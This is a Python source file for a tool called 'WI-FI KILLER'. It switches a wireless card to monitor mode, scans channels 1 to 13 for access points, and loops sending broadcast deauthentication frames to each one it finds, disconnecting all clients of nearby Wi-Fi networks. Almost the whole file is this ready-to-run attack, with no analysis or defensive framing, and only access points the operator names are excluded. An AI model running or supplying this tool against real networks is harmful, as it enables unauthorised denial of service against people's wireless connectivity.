#!/usr/bin/env python

import os
import sys
import re
import argparse
from scapy.all import *
from blessings import Terminal
from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth

# Font colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray
T = '\033[93m'  # tan

# Background colors
BB = '\033[40m'  # black
BR = '\033[41m'  # red
BG = '\033[42m'  # green
BY = '\033[43m'  # yellow
BBL = '\033[44m'  # blue
BM = '\033[45m'  # magenta
BC = '\033[46m'  # cyan
BW = '\033[47m'  # white

scanned_aps = []
scanned_channels = []
term = Terminal()
y_location = 6


def load_config():
    options = argparse.ArgumentParser()

    options.add_argument("--count",
                         type=int,
                         default=-1,
                         help="Set the number of beacons to probe. Set count to -1 for a loop (Default: -1)")

    options.add_argument("--sniff_timeout",
                         type=float,
                         default=0.1,
                         help="Set time to use (in seconds) during sniffing operations (Default: 0.1)")

    options.add_argument("--ignore_aps",
                         help="Set a list of of Access point Mac address list "
                              "ignored by deauthing attack divided by a comma (,)")

    options.add_argument("--monitor_creation",
                         default="new",
                         help="Select the method used to create the monitor mode interface."
                              " It can be <new> or <old> (Default: new)  ")

    options.add_argument("--silent",
                         action="store_true",
                         help="Suppress console logging")

    options.add_argument("--pepe",
                         dest="ee",
                         action="store_true",
                         help=argparse.SUPPRESS)

    required_arguments = options.add_argument_group(title="required arguments")

    required_arguments.add_argument("--interface",
                                    required=True,
                                    help="Select wireless interface")

    return options.parse_args()


def sprint(arg):
    config = load_config()
    if config.silent is False:
        print(arg)


def generate_ignored_aps_list(ignored_aps):
    if ignored_aps is not None:
        ignored_aps = re.split(",", ignored_aps)
        return ignored_aps
    else:
        return []


def splashscreen(config):
    if config.ee is True:
        sprint(
            B + '''      _                ___       _.--.\n      \`.|\..----...-'`   `-._.-'_.-'`\n      /  ' `         ,       __.--'\n      )/' _/     \   `-_,   /\n      `-'" `"\_  ,_.-;_.-\_ ',\n          _.-'_./   {_.'   ; /\n()       {_.-``-'         {_/\n              ''' + W)

    if config.ee is False:
        sprint(G + "+-------------------------------+")
        sprint("|                               |")
        sprint("|         WI-FI KILLER          |")
        sprint("|                               |")
        sprint("+-------------------------------+" + W)


def check_privileges():
    if os.getuid() != 0:
        sprint(R + "This script must be run as root" + W)
        sys.exit(1)
    sprint(G + "Privileges check passed" + W)


def check_required_binaries(config):
    binaries = [
        "ip",
        "iw"
    ]

    if config.monitor_creation == "old":
        binaries = [
            "ifconfig",
            "iwconfig",
        ]

    for binary in binaries:
        command = "which " + binary + " >> /dev/null"
        result = os.system(command)
        if result != 0:
            sprint(R + binary + " not found, install it before procede" + W)
            sys.exit(1)
    sprint(G + "Binaries check passed. All binaries found" + W)


def init_monitor_mode(config):
    commands = [
        "ip link set dev " + config.interface + " down",
        "iw " + config.interface + " set monitor none",
        "ip link set dev " + config.interface + " up",
    ]

    if config.monitor_creation == "old":
        commands = [
            "ifconfig " + config.interface + " down",
            "iwconfig " + config.interface + " mode monitor",
            "ifconfig " + config.interface + " up",
        ]

    sprint(O + "Initializing monitor mode conversion procedure" + W)
    for command in commands:
        return_code = os.system(command)
        if return_code != 0:
            sys.exit(return_code)

    sprint(G + "Done" + W)


def init_shutdown_procedure(config):
    commands = [
        "ip link set dev " + config.interface + " down",
        "iw " + config.interface + " set type managed",
        "ip link set dev " + config.interface + " up",
    ]

    if config.monitor_creation == "old":
        commands = [
            "ifconfig " + config.interface + " down",
            "iwconfig " + config.interface + " mode managed",
            "ifconfig " + config.interface + " up"
        ]

    sprint(O + "Initializing shutdown procedure" + W)
    for command in commands:
        return_code = os.system(command)
        if return_code != 0:
            sys.exit(return_code)

    sprint(G + "Done, good bye" + W)
    sys.exit(0)


def packet_handler(packet):
    config = load_config()
    ignored_aps = generate_ignored_aps_list(config.ignore_aps)
    if packet.type == 0 and packet.subtype == 8:
        if packet.addr2 not in scanned_aps and packet.addr2 not in ignored_aps:
            channel = str(ord(packet[Dot11Elt:3].info))
            if channel is not None:
                scanned_aps.append(packet.addr2)
                scanned_channels.append(channel)

            with term.location(0, 5):
                sprint("+----------------- DETECTED -----------------+")
            global y_location
            with term.location(0, y_location):
                sprint("SSID: " + G + bytes(packet.info).decode("UTF-8") + W + " MAC: " + G + str(
                    packet.addr2) + W + " Channel: " + G + channel + W)
                y_location += 1


def scan_and_deauth(config):
    os.system("clear")
    sprint(term.move(term.height - 1, 0))

    main_count = config.count
    main_index = 0
    if config.count == -1:
        main_count = 1
    with term.location(0, 0):
        sprint("+--------------------------------------------+")
    with term.location(0, 3):
        sprint("+--------------------------------------------+")

    while main_index < main_count:

        channels = range(1, 14)
        for channel in channels:

            with term.location(0, 1):
                sprint(term.clear_eol() + "| Sniffing on channel number " + G + str(channel) + W)
            with term.location(45, 1):
                sprint("|")

            command = "iw dev " + config.interface + " set channel " + str(channel)
            if config.monitor_creation == "old":
                command = "iwconfig " + config.interface + " channel " + str(channel)
            os.system(command)

            sniff(iface=config.interface, prn=packet_handler, timeout=config.sniff_timeout)
            channel_counter = range(0, len(scanned_channels))

            for count in channel_counter:
                command = "iw dev " + config.interface + " set channel " + scanned_channels[count]
                if config.monitor_creation == "old":
                    command = "iwconfig " + config.interface + " channel " + scanned_channels[count]
                os.system(command)

                with term.location(0, 2):
                    sprint(term.clear_eol() + "| Deauthing: " + R + scanned_aps[count] + W + " on channel " + R +
                           scanned_channels[count] + W)

                with term.location(45, 2):
                    sprint("|")

                deauth_packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=scanned_aps[count], addr3=scanned_aps[count]) / Dot11Deauth(reason=7)

                sendp(deauth_packet, iface=config.interface, verbose=False)

                if config.count != -1:
                    main_index += 1


if __name__ == '__main__':
    config = load_config()

    try:
        splashscreen(config)
        check_privileges()
        check_required_binaries(config)
        init_monitor_mode(config)

        scan_and_deauth(config)
        init_shutdown_procedure(config)

    except KeyboardInterrupt:
        sprint(R + "Detected KeyboardInterrupt" + W)
        init_shutdown_procedure(config)
